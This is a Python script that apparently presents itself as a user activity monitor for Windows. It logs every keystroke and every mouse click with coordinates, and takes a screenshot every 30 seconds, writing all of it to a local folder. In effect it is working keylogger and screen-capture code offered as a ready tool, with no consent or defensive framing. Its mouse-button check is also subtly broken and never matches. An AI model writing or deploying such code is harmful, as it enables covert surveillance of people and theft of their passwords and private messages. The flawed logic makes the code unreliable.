import os
import time
import threading
import pyautogui
import keyboard
import win32gui
import win32con
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener

# Global variables
output_directory = "activity_logs"
screenshot_interval = 30  # in seconds

# Create the output directory if it doesn't exist
if not os.path.exists(output_directory):
    os.mkdir(output_directory)


# Function to capture screenshots at regular intervals
def capture_screenshots():
    while True:
        screenshot = pyautogui.screenshot()
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(output_directory, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        time.sleep(screenshot_interval)


# Function to record keyboard input
def on_key_press(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        if str(key) == "Key.space":
            key_str = " "
        else:
            key_str = str(key)

    with open(os.path.join(output_directory, "keyboard_log.txt"), "a") as f:
        f.write(key_str)


# Function to record mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        button_name = ""
        if button == win32con.VK_LBUTTON:
            button_name = "Left"
        elif button == win32con.VK_RBUTTON:
            button_name = "Right"
        elif button == win32con.VK_MBUTTON:
            button_name = "Middle"

        with open(os.path.join(output_directory, "mouse_log.txt"), "a") as f:
            f.write(f"{button_name} Click at ({x}, {y})\n")


# Function to start monitoring mouse activity
def start_mouse_listener():
    mouse_listener = MouseListener(on_click=on_click)
    mouse_listener.start()


# Function to start monitoring keyboard activity
def start_keyboard_listener():
    keyboard_listener = KeyboardListener(on_press=on_key_press)
    keyboard_listener.start()


# Main function
def main():
    print("Monitoring user activity...")

    # Start the thread to capture screenshots
    screenshot_thread = threading.Thread(target=capture_screenshots)
    screenshot_thread.daemon = True
    screenshot_thread.start()

    # Start monitoring mouse activity
    start_mouse_listener()

    # Start monitoring keyboard activity
    start_keyboard_listener()

    # Keep the program running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Monitoring stopped.")


if __name__ == "__main__":
    main()
